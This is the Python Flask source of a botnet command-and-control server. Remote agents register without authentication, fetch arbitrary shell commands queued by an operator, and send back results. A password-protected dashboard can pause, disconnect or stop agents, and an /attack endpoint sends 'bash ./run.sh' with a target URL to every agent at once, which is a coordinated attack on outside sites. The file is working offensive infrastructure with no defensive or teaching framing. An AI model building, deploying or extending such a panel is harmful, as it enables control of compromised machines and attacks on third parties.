import os
import json
import threading
import time
from functools import wraps
from flask import (
    Flask, request, jsonify, render_template, redirect, url_for,
    session, flash
)

DATA_FILE = "data.json"
ADMIN_PASS = os.getenv("ADMIN_PASS", "1213")
SECRET_KEY = os.getenv("SECRET_KEY", "change-me-in-envdsadadsad")
ACTIVE_THRESHOLD = int(os.getenv("ACTIVE_THRESHOLD", "60"))  # seconds to consider agent active

app = Flask(__name__)
app.secret_key = SECRET_KEY
lock = threading.Lock()


# ----------------- DATA UTILS -----------------
def init_data():
    if not os.path.exists(DATA_FILE):
        data = {
            "meta": {"paused": False},
            "agents": {},   # agent_id -> {info, queue, last_seen, disabled, current_cmd}
            "logs": []
        }
        with open(DATA_FILE, "w") as f:
            json.dump(data, f, indent=2)


def read_data():
    with lock:
        with open(DATA_FILE, "r") as f:
            return json.load(f)


def write_data(data):
    with lock:
        with open(DATA_FILE, "w") as f:
            json.dump(data, f, indent=2)


def add_log(log_type, message, agent=None, cmd=None, status="success"):
    """Enhanced logging function"""
    data = read_data()
    log_entry = {
        "ts": int(time.time()),
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "type": log_type,
        "message": message,
        "status": status
    }
    if agent:
        log_entry["agent"] = agent
    if cmd:
        log_entry["cmd"] = cmd
    
    data.setdefault("logs", []).append(log_entry)
    write_data(data)


def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if session.get("logged_in"):
            return f(*args, **kwargs)
        return redirect(url_for("login", next=request.path))
    return decorated


# ----------------- AUTH -----------------
@app.route("/")
def index():
    if session.get("logged_in"):
        return redirect(url_for("dashboard"))
    return redirect(url_for("login"))


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        pw = request.form.get("password", "")
        if pw == ADMIN_PASS:
            session["logged_in"] = True
            flash("Login successful", "success")
            return redirect(url_for("dashboard"))
        else:
            flash("Invalid password", "danger")
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("login"))


# ----------------- DASHBOARD -----------------
@app.route("/dashboard")
@login_required
def dashboard():
    data = read_data()
    agents = data.get("agents", {})
    logs = list(reversed(data.get("logs", [])))[:400]
    now = int(time.time())
    # compute active counts
    active_agents = [aid for aid, a in agents.items() if (now - a.get("last_seen", 0)) <= ACTIVE_THRESHOLD]
    inactive_agents = [aid for aid in agents.keys() if aid not in active_agents]
    return render_template(
        "dashboard.html",
        agents=agents,
        logs=logs,
        active_count=len(active_agents),
        inactive_count=len(inactive_agents),
        paused=data.get("meta", {}).get("paused", False)
    )


# ----------------- NEW ROUTES -----------------
@app.route("/agents")
@login_required
def agents():
    data = read_data()
    agents_list = []
    now = int(time.time())
    for aid, info in data.get("agents", {}).items():
        last_seen_ts = info.get("last_seen", 0)
        time_diff = now - last_seen_ts
        status = "disabled" if info.get("disabled") else (
            "active" if time_diff <= ACTIVE_THRESHOLD else "inactive"
        )
        
        agents_list.append({
            "id": aid,
            "last_seen": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(last_seen_ts)),
            "time_diff": f"{time_diff}s ago" if time_diff > 0 else "now",
            "status": status
        })
    return jsonify(agents_list)


@app.route("/disconnect/<agent_id>", methods=["POST"])
@login_required
def disconnect_agent(agent_id):
    data = read_data()
    if agent_id not in data.get("agents", {}):
        add_log("disconnect", f"Failed to disconnect {agent_id}: Agent not found", agent_id, status="error")
        return jsonify({"status": "error", "msg": "Agent not found"}), 404
    
    data["agents"][agent_id]["disabled"] = True
    add_log("disconnect", f"Agent {agent_id} disconnected successfully", agent_id, status="success")
    write_data(data)
    return jsonify({"status": "success", "msg": f"Agent {agent_id} disconnected"})


@app.route("/reconnect/<agent_id>", methods=["POST"])
@login_required
def reconnect_agent(agent_id):
    data = read_data()
    if agent_id not in data.get("agents", {}):
        add_log("reconnect", f"Failed to reconnect {agent_id}: Agent not found", agent_id, status="error")
        return jsonify({"status": "error", "msg": "Agent not found"}), 404
    
    data["agents"][agent_id]["disabled"] = False
    add_log("reconnect", f"Agent {agent_id} reconnected successfully", agent_id, status="success")
    write_data(data)
    return jsonify({"status": "success", "msg": f"Agent {agent_id} reconnected"})


@app.route("/disconnect_all", methods=["POST"])
@login_required
def disconnect_all():
    data = read_data()
    count = 0
    for aid in data.get("agents", {}):
        if not data["agents"][aid].get("disabled"):
            data["agents"][aid]["disabled"] = True
            count += 1
    
    add_log("disconnect_all", f"Disconnected {count} agents successfully", status="success")
    write_data(data)
    return jsonify({"status": "success", "msg": f"All agents disconnected ({count} agents)"})


@app.route("/reconnect_all", methods=["POST"])
@login_required
def reconnect_all():
    data = read_data()
    count = 0
    for aid in data.get("agents", {}):
        if data["agents"][aid].get("disabled"):
            data["agents"][aid]["disabled"] = False
            count += 1
    
    add_log("reconnect_all", f"Reconnected {count} agents successfully", status="success")
    write_data(data)
    return jsonify({"status": "success", "msg": f"All agents reconnected ({count} agents)"})


# ----------------- STOP ALL -----------------
@app.route("/stop_all", methods=["POST"])
@login_required
def stop_all():
    data = read_data()
    count = 0
    for aid, entry in data.get("agents", {}).items():
        if not entry.get("disabled"):
            entry.setdefault("queue", []).append("__STOP__")
            count += 1
    
    add_log("stop_all", f"Stop command sent to {count} active agents", "all", "__STOP__", "success")
    write_data(data)
    return jsonify({"status": "success", "msg": f"Stop command sent to {count} agents"})


# ----------------- SEND CMD -----------------
@app.route("/send", methods=["POST"])
@login_required
def send():
    if request.is_json:
        payload = request.get_json(force=True, silent=True) or {}
        agent = payload.get("agent", "all")
        cmd = (payload.get("cmd") or "").strip()
    else:
        agent = request.form.get("agent")
        cmd = (request.form.get("cmd") or "").strip()

    if not cmd:
        add_log("send", "Failed to send command: Empty command", agent, cmd, "error")
        return jsonify({"status": "error", "message": "Empty command"}), 400

    data = read_data()
    count = 0
    
    if agent == "all":
        for a in data["agents"].keys():
            if data["agents"][a].get("disabled"):
                continue
            data["agents"][a].setdefault("queue", []).append(cmd)
            count += 1
        add_log("send", f"Command '{cmd}' sent to {count} agents", "all", cmd, "success")
    else:
        if agent not in data["agents"]:
            add_log("send", f"Failed to send command to {agent}: Agent not found", agent, cmd, "error")
            return jsonify({"status": "error", "message": "Agent not found"}), 404
        if data["agents"][agent].get("disabled"):
            add_log("send", f"Failed to send command to {agent}: Agent is disconnected", agent, cmd, "error")
            return jsonify({"status": "error", "message": "Agent is disconnected"}), 400
        data["agents"][agent].setdefault("queue", []).append(cmd)
        add_log("send", f"Command '{cmd}' sent to agent {agent}", agent, cmd, "success")
        count = 1

    write_data(data)
    return jsonify({"status": "success", "message": f"Command queued to {count} agent(s)"})


# ----------------- CONTROL ENDPOINTS -----------------
@app.route("/pause", methods=["POST"])
@login_required
def pause():
    data = read_data()
    data.setdefault("meta", {})["paused"] = True
    add_log("pause", "Server paused successfully", status="success")
    write_data(data)
    return jsonify({"status": "success", "msg": "Server paused"})


@app.route("/resume", methods=["POST"])
@login_required
def resume():
    data = read_data()
    data.setdefault("meta", {})["paused"] = False
    add_log("resume", "Server resumed successfully", status="success")
    write_data(data)
    return jsonify({"status": "success", "msg": "Server resumed"})


# ----------------- AGENT API -----------------
@app.route("/register", methods=["POST"])
def register():
    payload = request.get_json(force=True, silent=True) or {}
    agent_id = payload.get("agent_id") or request.form.get("agent_id")
    info = payload.get("info", {})
    if not agent_id:
        return jsonify({"status": "error", "msg": "missing agent_id"}), 400
    data = read_data()
    data.setdefault("agents", {})
    entry = data["agents"].setdefault(agent_id, {})
    entry["info"] = info
    entry.setdefault("queue", [])
    entry["last_seen"] = int(time.time())
    entry.setdefault("disabled", False)
    entry.setdefault("current_cmd", None)
    
    # Log registration
    add_log("register", f"Agent {agent_id} registered successfully", agent_id, status="success")
    
    write_data(data)
    return jsonify({"status": "ok", "msg": "registered"})


@app.route("/task", methods=["GET"])
def task():
    agent = request.args.get("agent")
    if not agent:
        return jsonify({"status": "error", "msg": "missing agent param"}), 400
    data = read_data()
    agents = data.setdefault("agents", {})
    entry = agents.setdefault(agent, {"info": {}, "queue": [], "last_seen": int(time.time()), "disabled": False, "current_cmd": None})
    entry["last_seen"] = int(time.time())
    if data.get("meta", {}).get("paused"):
        write_data(data)
        return jsonify({"cmd": None, "reason": "paused"})
    if entry.get("disabled"):
        write_data(data)
        return jsonify({"cmd": None, "reason": "disabled"})
    q = entry.setdefault("queue", [])
    if q:
        cmd = q.pop(0)
        entry["current_cmd"] = cmd
        add_log("dispatch", f"Command dispatched to {agent}: {cmd[:100]}...", agent, cmd, "success")
        write_data(data)
        return jsonify({"cmd": cmd})
    else:
        write_data(data)
        return jsonify({"cmd": None})


@app.route("/task_result", methods=["POST"])
def task_result():
    payload = request.get_json(force=True, silent=True) or {}
    agent = payload.get("agent_id") or request.form.get("agent_id")
    cmd = payload.get("cmd") or request.form.get("cmd")
    result = payload.get("result") or request.form.get("result")
    if not agent or cmd is None:
        return jsonify({"status": "error", "msg": "missing fields"}), 400
    
    # Determine if command was successful
    status = "success"
    if result and ("error:" in result.lower() or "failed" in result.lower()):
        status = "error"
    elif result and "code=0" in result:
        status = "success"
    elif result and ("code=" in result and "code=0" not in result):
        status = "warning"
    
    data = read_data()
    add_log("result", f"Command result from {agent}: {cmd[:50]}...", agent, cmd, status)
    
    agent_entry = data.setdefault("agents", {}).setdefault(agent, {})
    if agent_entry.get("current_cmd") == cmd:
        agent_entry["current_cmd"] = None
    agent_entry["last_seen"] = int(time.time())
    write_data(data)
    return jsonify({"status": "ok"})


@app.route("/attack", methods=["POST"])
@login_required
def attack():
    if request.is_json:
        payload = request.get_json(force=True, silent=True) or {}
        url = (payload.get("url") or "").strip()
    else:
        url = (request.form.get("url") or "").strip()

    if not url:
        add_log("attack", "Attack failed: URL required", status="error")
        return jsonify({"status": "error", "message": "URL required"}), 400

    cmd = f"bash ./run.sh {url}"
    data = read_data()
    count = 0
    
    for a in data.get("agents", {}):
        if not data["agents"][a].get("disabled"):
            data["agents"][a].setdefault("queue", []).append(cmd)
            count += 1

    add_log("attack", f"Attack launched on {url} - sent to {count} agents", "all", cmd, "success")
    write_data(data)

    return jsonify({"status": "success", "message": f"Attack done - queued to {count} agents"})


# ----------------- AGENT LOG ENDPOINT -----------------
@app.route("/agent_log", methods=["POST"])
def agent_log():
    """Receive logs from agents"""
    payload = request.get_json(force=True, silent=True) or {}
    agent_id = payload.get("agent_id")
    message = payload.get("message")
    level = payload.get("level", "INFO")
    
    if agent_id and message:
        add_log("agent_log", f"[{level}] {message}", agent_id, status="info")
    
    return jsonify({"status": "ok"})


# ----------------- LOG MANAGEMENT ENDPOINTS -----------------
@app.route("/logs")
@login_required
def get_logs():
    """Get logs for frontend"""
    data = read_data()
    logs = list(reversed(data.get("logs", [])))[:100]  # Latest 100 logs
    return jsonify(logs)


@app.route("/clear_logs", methods=["POST"])
@login_required
def clear_logs():
    """Clear all logs"""
    data = read_data()
    data["logs"] = []
    add_log("system", "All logs cleared by admin", status="success")
    write_data(data)
    return jsonify({"status": "success", "message": "Logs cleared"})


if __name__ == "__main__":
    init_data()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", "5000")))